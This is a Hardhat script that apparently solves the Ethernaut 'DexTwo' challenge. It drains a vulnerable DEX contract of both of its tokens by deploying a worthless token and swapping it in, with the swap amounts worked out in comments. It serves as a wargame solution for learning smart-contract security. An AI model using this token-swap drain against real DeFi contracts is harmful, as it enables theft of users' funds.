import { TransactionResponse } from "@ethersproject/providers";
import { fail } from "assert";
import { ethers } from "hardhat";

async function dexTwoHack() {
  let tx: TransactionResponse;
  const dexTwoAddress = process.env.DEX_TWO_ADDRESS || fail("DEX_TWO_ADDRESS Not Found In .env");
  const dexTwo = await ethers.getContractAt("DexTwo", dexTwoAddress);

  const [attacker] = await ethers.getSigners();
  const attackerAddress = await attacker.getAddress();

  const tokenOne = await ethers.getContractAt("SwappableTokenTwo", await dexTwo.token1());
  const tokenTwo = await ethers.getContractAt("SwappableTokenTwo", await dexTwo.token2());

  const UselessToken = await ethers.getContractFactory("UselessToken");
  const uselessToken = await UselessToken.connect(attacker).deploy("UselessToken", "UTN", 500);
  await uselessToken.deployed();

  // approve DexTwo to spend UselessToken on behalf of attacker
  tx = await uselessToken.connect(attacker).approve(dexTwo.address, 500);
  await tx.wait(1);

  // send UselessToken to dex
  tx = await uselessToken.connect(attacker).transfer(dexTwo.address, 100);
  await tx.wait(1);

  tx = await dexTwo.connect(attacker).swap(uselessToken.address, tokenOne.address, 100);
  await tx.wait(1);

  // Calculate amount of UselessToken to swap to get Token2
  // The number of token2 to be returned = (amount of token1 to be swapped * token2 balance of the contract)/token1 balance of the contract.
  // 100 = (x * 100)/200
  // x = 200

  tx = await dexTwo.connect(attacker).swap(uselessToken.address, tokenTwo.address, 200);
  await tx.wait(1);

  console.log("Balance After Hack");
  console.log("TokenOne : ", await tokenOne.balanceOf(dexTwo.address));
  console.log("TokenTwo : ", await tokenTwo.balanceOf(dexTwo.address));

  console.log("SUCCESS!!! Submit the instance.");
}

dexTwoHack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
